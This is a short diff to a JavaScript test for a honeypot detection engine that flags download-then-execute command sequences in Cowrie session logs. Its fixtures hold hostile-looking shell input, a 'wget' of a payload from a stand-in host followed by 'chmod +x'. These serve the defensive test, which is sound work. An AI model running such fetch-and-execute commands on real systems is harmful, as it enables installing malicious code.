@@ -167,6 +167,7 @@ test('Download-then-execute chain requires download before execution', () => {
         { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' },
         { eventid: 'cowrie.command.input', input: 'chmod +x payload' }
     ]);
+
     const executedFirst = engine.evaluateSessionEvents([
         { eventid: 'cowrie.login.success', username: 'root' },
         { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
@@ -176,8 +177,8 @@ test('Download-then-execute chain requires download before execution', () => {
     assert.ok(downloadedFirst.explanations.some(e =>
         e.reason.includes('Download → Execute sequence')
     ));
+
     assert.ok(!executedFirst.explanations.some(e =>
         e.reason.includes('Download → Execute sequence')
     ));
 });
-
